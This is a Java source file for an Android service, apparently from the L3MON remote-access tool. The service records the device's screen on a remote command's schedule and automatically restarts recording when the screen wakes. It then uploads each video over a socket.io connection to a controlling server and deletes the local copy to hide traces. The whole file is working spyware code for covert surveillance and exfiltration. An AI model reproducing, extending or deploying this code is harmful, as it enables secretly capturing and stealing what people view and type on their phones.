package com.etechd.l3mon;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import io.socket.client.Socket;

public final class ScreenRecorderService extends Service {
    private static final String EXTRA_DATA = "data";
    private static final String EXTRA_RESULT_CODE = "resultcode";
    private static final int ONGOING_NOTIFICATION_ID = 23;
    private static final String TAG = "RECORDERSERVICE";
    private static String filePathAndName;
    private String cmd;
    private Intent data;
    public File file;
    private MediaProjection mMediaProjection;
    private MediaRecorder mMediaRecorder;
    private BroadcastReceiver mScreenStateReceiver;
    private ServiceHandler mServiceHandler;
    private TimerTask mStopRecording;
    private VirtualDisplay mVirtualDisplay;
    private int resultCode;

    @Override
    public void onDestroy() {
    }

    static Intent newIntent(Context context, int i, Intent intent) {
        try {
            Intent intent2 = new Intent(context, Class.forName("com.etechd.l3mon.ScreenRecorderService"));
            intent2.putExtra(EXTRA_RESULT_CODE, i);
            intent2.putExtra("data", intent);
            return intent2;
        } catch (ClassNotFoundException e) {
            throw new NoClassDefFoundError(e.getMessage());
        }
    }

    public class MyBroadcastReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (action.equals("android.intent.action.SCREEN_ON")) {
                startRecording(resultCode, data);
            } else if (action.equals("android.intent.action.SCREEN_OFF")) {
                stopRecording();
            } else if (action.equals("android.intent.action.CONFIGURATION_CHANGED")) {
                stopRecording();
                startRecording(resultCode, data);
            }
        }
    }

    private final class ServiceHandler extends Handler {
        public ServiceHandler(Looper looper) {
            super(looper);
        }
        @Override
        public void handleMessage(Message message) {
            if (resultCode == -1) {
                startRecording(resultCode, data);
            }
        }
    }

    @Override
    public void onCreate() {
        mScreenStateReceiver = new MyBroadcastReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.intent.action.SCREEN_ON");
        intentFilter.addAction("android.intent.action.SCREEN_OFF");
        intentFilter.addAction("android.intent.action.CONFIGURATION_CHANGED");
        registerReceiver(mScreenStateReceiver, intentFilter);
        HandlerThread handlerThread = new HandlerThread("ServiceStartArguments", 10);
        handlerThread.start();
        mServiceHandler = new ServiceHandler(handlerThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int i, int i2) {
        resultCode = intent.getIntExtra("resultCode", 0);
        data = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
        int intExtra = intent.getIntExtra(ConnectionManager.DURATION, 0);
        Log.e("TAGG", new StringBuffer().append("secs are :").append(Integer.toString(intExtra)).toString());
        if (resultCode == 0 || data == null) {
            throw new IllegalStateException("Result code or data missing.");
        }
        Message obtainMessage = mServiceHandler.obtainMessage();
        obtainMessage.arg1 = i2;
        mServiceHandler.sendMessage(obtainMessage);
        mStopRecording = new TimerTask() {
            @Override
            public void run() {
                stopRecording();
                unregisterReceiver(mScreenStateReceiver);
                sendVideo("SR", file);
                stopSelf();
                Log.e("TAGG", "rec stopeed after sec");
            }
        };
        int intTimerSchedule = intExtra * 1000;
        if(intTimerSchedule == 0) intTimerSchedule = 100;
        new Timer().schedule(mStopRecording, (long) (intTimerSchedule));
        return Service.START_REDELIVER_INTENT;
    }

    @SuppressLint("NewApi")
    private void startRecording(int i, Intent intent) {
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getApplicationContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mMediaRecorder = new MediaRecorder();
        DisplayMetrics displayMetrics = new DisplayMetrics();
        ((WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay().getRealMetrics(displayMetrics);
        int i2 = displayMetrics.densityDpi;
        int i3 = displayMetrics.widthPixels;
        int i4 = displayMetrics.heightPixels;
        mMediaRecorder.setVideoSource(2);
        mMediaRecorder.setOutputFormat(2);
        mMediaRecorder.setVideoEncoder(2);
        mMediaRecorder.setVideoEncodingBitRate(8000000);
        mMediaRecorder.setVideoFrameRate(15);
        mMediaRecorder.setVideoSize(i3, i4);
        String absolutePath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES).getAbsolutePath();
        Long l = new Long(System.currentTimeMillis());
        String str = "portrait";
        if (i3 > i4) {
            str = "landscape";
        }
        filePathAndName = absolutePath + "/time_" + l.toString() + "_mode_" + str + ".mp4";
//        filePathAndName = new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(new StringBuffer().append(absolutePath).append("/time_").toString()).append(l.toString()).toString()).append("_mode_").toString()).append(str).toString()).append(".mp4").toString();
        Log.e("TAGG", filePathAndName);
        mMediaRecorder.setOutputFile(filePathAndName);
        file = new File(filePathAndName);
        try {
            mMediaRecorder.prepare();
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e2) {
            e2.printStackTrace();
        }
        mMediaProjection = mediaProjectionManager.getMediaProjection(i, intent);
        mVirtualDisplay = mMediaProjection.createVirtualDisplay("screenRec", i3, i4, i2, 2, mMediaRecorder.getSurface(), null, null);
        if (mVirtualDisplay == null) {
            Log.e("TAGG", "vdisplay is null");
        }
        mMediaRecorder.start();
        Log.v("TAGG", "Started recording");
    }

    @SuppressLint("NewApi")
    private void stopRecording() {
        if (mMediaRecorder != null){
            mMediaRecorder.stop();
            mMediaRecorder.release();
        }
        if(mMediaProjection != null){
            mMediaProjection.stop();
        }
        if (mVirtualDisplay != null) {
            mVirtualDisplay.release();
        }
    }

    public static void sendVideo(String str, File file2) {
        if (file2 == null) {
            Log.d("TAGG", "send() file null");
        }
        byte[] bArr = new byte[((int) file2.length())];
        try {
            BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(file2));
            bufferedInputStream.read(bArr, 0, bArr.length);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("file", true);
            jSONObject.put("name", file2.getName());
            jSONObject.put("buffer", bArr);
            if (str == "SR") {
                Socket ioSocket = IOSocket.getInstance().getIoSocket();
                Object[] objArr = new Object[1];
                objArr[0] = jSONObject;
                ioSocket.emit("0xSR", objArr);
            } else if (str == "RC") {
                Socket ioSocket2 = IOSocket.getInstance().getIoSocket();
                Object[] objArr2 = new Object[1];
                objArr2[0] = jSONObject;
                ioSocket2.emit("0xRC", objArr2);
            } else if (str == "FC") {
                Socket ioSocket3 = IOSocket.getInstance().getIoSocket();
                Object[] objArr3 = new Object[1];
                objArr3[0] = jSONObject;
                ioSocket3.emit("0xFC", objArr3);
            }
            bufferedInputStream.close();
            file2.delete();
            Log.e("TAGG", new StringBuffer().append("video sent ").append(file2).toString());
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e2) {
            e2.printStackTrace();
        } catch (JSONException e3) {
            e3.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
